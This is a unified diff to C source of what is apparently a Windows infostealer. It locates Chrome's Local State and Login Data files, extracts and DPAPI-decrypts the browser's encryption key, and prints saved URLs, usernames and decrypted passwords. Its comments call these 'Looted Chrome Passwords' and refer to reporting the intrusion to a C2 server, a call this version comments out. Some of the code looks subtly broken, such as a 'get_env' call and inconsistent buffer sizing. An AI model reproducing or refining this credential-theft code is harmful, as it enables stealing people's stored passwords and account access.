@@ -99,9 +99,8 @@ wchar_t* OSVersion(){
 //Get Local State
 BYTE* getLocalState(){
     HANDLE hStateFile;
-    FILE* localStateFile;
     DWORD LSFileSize;
-    wchar_t* username = CurrentUser();
+
     char* cLocalStatePath = (char*) malloc(1024);
     if (cLocalStatePath == NULL) {
         printf("Memory not successfully Allocated.\n");
@@ -109,8 +108,8 @@ BYTE* getLocalState(){
     // Building Path to Chrome Login Data
     sprintf(
         cLocalStatePath,
-        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
-        username
+        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
+        getenv("USERPROFILE")
     );
 
     //Get Local State File Handle
@@ -124,31 +123,28 @@ BYTE* getLocalState(){
         NULL
     );
     if (hStateFile == INVALID_HANDLE_VALUE) {
-        printf("Couldn't open Local State File %s", GetLastError());
+        printf("Couldn't open Local State File %s\n", GetLastError());
     }
+
     //Get File Size
     LSFileSize = GetFileSize(hStateFile, NULL);
     if (LSFileSize == INVALID_FILE_SIZE){
-        printf("Couldn't get file size with error: %s", GetLastError());
+        printf("Couldn't get file size with error: %s\n", GetLastError());
     };
 
-    //Open File
-    localStateFile = fopen(cLocalStatePath, "r");
-    if (localStateFile == NULL) {
-        printf("error getting file (fopen)");
-    }
-    BYTE* byteBuffer = (BYTE*) malloc (LSFileSize + 1);
-    if (byteBuffer == NULL){
-        printf("Memory not successfully Allocated.\n");
+    LPVOID fileContents = malloc(LSFileSize);
+    if(!ReadFile(
+        hStateFile,
+        fileContents,
+        LSFileSize,
+        NULL,
+        NULL
+    )){
+        printf("Critical error\n");
     }
 
-    //Read info in Local State
-    if(fgets(byteBuffer, LSFileSize, localStateFile) == NULL) {
-        printf("fgets error\n");
-    };
-    free(cLocalStatePath);
     CloseHandle(hStateFile);
-    return byteBuffer; //Don't forget to free later
+    return (BYTE*)fileContents; //Don't forget to free later
 }
 
 // Decrypt DPAPI
@@ -174,17 +170,18 @@ DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
         printf(" %02x ", in.pbData[i]);
     };
     //printf("NEXT IS IT %02x ", in);
-    if (CryptUnprotectData(&in, NULL, &entropy, NULL, NULL, 0, &out)){
+    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
         return out;
     }
     else{
-        printf("Decryption didn't work. ERROR %s", GetLastError());
+        printf("Decryption didn't work. ERROR %d", GetLastError());
     }
 }
 
 //Get Encrpytion Key
 char* getEncrpytKey(){
     BYTE* localState = getLocalState();
+    
     char* osCryptstr = (char*) malloc (1024);
     if (osCryptstr == NULL) {
         printf("Memory not successfully Allocated.\n");
@@ -209,43 +206,40 @@ char* getEncrpytKey(){
     }
     free(localState);
 
-    DWORD keySize = 0;
+    DWORD keySize = strlen(token);
+    DWORD bufSize = 0;
     // First Call to get length
-    BOOL firstDecode = CryptStringToBinaryA(token, 0, CRYPT_STRING_BASE64, NULL, &keySize, NULL, NULL);
+    BOOL firstDecode = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, NULL, &bufSize, NULL, NULL);
     if (firstDecode == 0){
         printf("Trouble 1Decoding\n");
     };
 
     //Decoding
-    BYTE* buffer = (BYTE*)malloc(keySize + 1);
+    BYTE* buffer = (BYTE*)malloc(keySize);
     if(buffer == NULL){
         printf("Memory not successfully allocated.\n");
     };
-    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &keySize, NULL, NULL);
+    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &bufSize, NULL, NULL);
     if (decoded == 0) {
         printf("Trouble Decoding\n");
     };
+    
 
-
-    BYTE* finalKey = (BYTE*) malloc (keySize-5);
+    BYTE* finalKey = (BYTE*) malloc (bufSize-5);
     if (finalKey == NULL) {
         printf("Memory not successfully allocated.\n");
     };
-    for(int i = 5; i < keySize; i++){
+    for(int i = 5; i < bufSize; i++){
         finalKey[i-5] = buffer[i];
-        //printf(" %02x ", buffer[i]);
-        //printf(" %02x ", finalKey[i-5]);
     }
     free(buffer);
     
-    //MessageBoxA(NULL, "", "", MB_OK);
-    //printf("DPAPI: --> %s", bstore);
-    printf("%s", decryptDPAPI(finalKey, keySize-5).pbData);
+    decryptDPAPI(finalKey, bufSize-5);
     return finalKey;
 }
 
 // Decrypt Looted Chrome Passwords
-char* Crack(BLOB* pass) {
+char* Crack(BLOB* pass, char* encKey) {
     DATA_BLOB in;
     DATA_BLOB out;
     DATA_BLOB blobEntropy;
@@ -282,8 +276,7 @@ char* Crack(BLOB* pass) {
 }
 
 //Loot Chrome Passwords
-wchar_t* GetPass(){
-    wchar_t* username = CurrentUser();
+wchar_t* GetPass(char* encKey){
     char* cPassPath = (char*) malloc(512);
     if (cPassPath == NULL) {
         printf("Memory not successfully Allocated.\n");
@@ -291,8 +284,8 @@ wchar_t* GetPass(){
     // Building Path to Chrome Login Data
     sprintf(
         cPassPath,
-        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-        username
+        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+        get_env("USERPROFILE")
     );
 
 // THE REAL DEAL
@@ -310,8 +303,8 @@ wchar_t* GetPass(){
                 BLOB* password = (BLOB*)sqlite3_column_text(stmt,2); //This is the only encrypted field
                 printf("Url: %s\n",url);
                 printf("Username: %s\n",username);
-                //The moment of Orgasm:)
-                char *decrypted = Crack(password);
+                
+                char *decrypted = Crack(password, encKey);
                 if (decrypted != NULL){
                     printf("Password: %s\n",decrypted);
                 }
@@ -429,8 +422,9 @@ int _tmain(int argc, _TCHAR *argv[]){
 
     if(argc == 1){
         // Report intrusion to C2
-        RegisterC2();
-        getEncrpytKey();
+        // RegisterC2();
+        char* encKey = getEncrpytKey();
+        GetPass(encKey);
     }
 /**
         while(1){
